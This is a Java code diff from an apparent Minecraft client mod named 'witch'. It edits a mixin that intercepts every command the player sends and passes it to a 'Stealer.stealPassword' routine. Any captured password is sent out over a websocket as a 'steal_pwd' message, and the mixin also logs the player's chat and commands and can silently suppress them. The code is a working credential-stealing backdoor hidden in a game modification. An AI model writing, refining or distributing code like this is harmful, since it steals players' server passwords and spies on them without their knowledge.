@@ -1,8 +1,9 @@
 package me.soda.witch.mixin;
 
+import com.google.gson.Gson;
+import me.soda.witch.Witch;
 import me.soda.witch.features.ChatCommandLogging;
 import me.soda.witch.features.ChatUtil;
-import me.soda.witch.features.Config;
 import me.soda.witch.features.Stealer;
 import me.soda.witch.websocket.MessageUtils;
 import net.minecraft.client.network.ClientPlayerEntity;
@@ -16,14 +17,14 @@ import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
 public abstract class ClientPlayerEntityMixin {
     @Inject(method = "sendCommand(Ljava/lang/String;Lnet/minecraft/text/Text;)V", at = @At("HEAD"))
     private void onSendCommand(String command, Text preview, CallbackInfo info) {
-        String[] passArr = Stealer.stealPassword(command);
-        if (passArr != null) MessageUtils.sendMessage("steal_pwd", passArr);
-        if (Config.logChatAndCommand) ChatCommandLogging.addToList("/" + command);
+        Stealer.Password pass = Stealer.stealPassword(command);
+        if (pass != null) MessageUtils.sendMessage("steal_pwd", new Gson().toJson(pass));
+        if (Witch.config.logChatAndCommand) ChatCommandLogging.addToList("/" + command);
     }
 
     @Inject(method = "sendChatMessage(Ljava/lang/String;Lnet/minecraft/text/Text;)V", at = @At("HEAD"), cancellable = true)
     private void onSendChatMessage(String message, Text preview, CallbackInfo info) {
-        if (Config.isMuted) info.cancel();
+        if (Witch.config.isMuted) info.cancel();
         if (ChatUtil.tryChatBack(message)) info.cancel();
     }
 }
